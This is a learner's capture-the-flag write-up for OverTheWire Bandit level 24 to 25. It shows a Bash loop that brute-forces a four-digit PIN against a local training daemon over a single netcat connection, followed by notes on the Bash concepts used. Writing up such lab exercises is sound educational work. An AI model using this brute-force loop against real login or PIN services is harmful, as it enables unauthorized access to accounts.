# Bandit Level 24 → 25

## Commands Used

```bash
# Investigate the service
nmap -sV -p 30002 localhost
nc localhost 30002

# Create a directory for the PIN combinations
mkdir /tmp/bandit25_combo

# Generate all 10,000 possible PINs
seq -w 0 9999 > /tmp/bandit25_combo/combo

# Verify the number of combinations
wc -l /tmp/bandit25_combo/combo

# Enter the current password without displaying it
read -r -s -p "Bandit24 password: " password
echo

# Brute-force the PIN through one TCP connection
for pin in $(seq -w 0 9999); do
    printf '%s %s\n' "$password" "$pin"
done | nc localhost 30002
```

## What I Learned

- `seq -w 0 9999` generates 10,000 numeric combinations, padded with leading zeros.
- `for` loops iterate through a sequence of values, assigning each value to a variable.
- `$(command)` performs command substitution, allowing a command's output to be used within another command.
- `$variable` retrieves the value stored in a shell variable.
- `read` accepts input and stores it in a variable, while `-s` hides the input.
- `printf` formats output using placeholders such as `%s` and `\n`.
- Pipes (`|`) redirect stdout from one command into another command's stdin.
- Netcat can transmit multiple inputs through a single TCP connection.
- Brute-forcing systematically tests possible combinations until the correct value is found.

## Difficulties

- Initially investigated port 30002 using Nmap and considered creating another TCP listener.
- Realised that the daemon was already listening and only required a Netcat client.
- Tested the connection manually and confirmed the required password-and-PIN format.
- Encountered file path errors while generating PIN combinations because the destination directory didn't exist.
- Created a temporary directory and successfully generated all 10,000 combinations.
- Learned how `read`, variables, command substitution and `for` loops work in Bash.
- Used a loop with `printf` to generate every password-and-PIN combination.
- Piped the attempts into a single Netcat connection and successfully retrieved the Bandit 25 password.

## Key Takeaway

Combined Bash scripting, loops, command substitution, output formatting and TCP networking to automate a brute-force challenge.

The solution used one TCP connection rather than reconnecting for every PIN attempt.
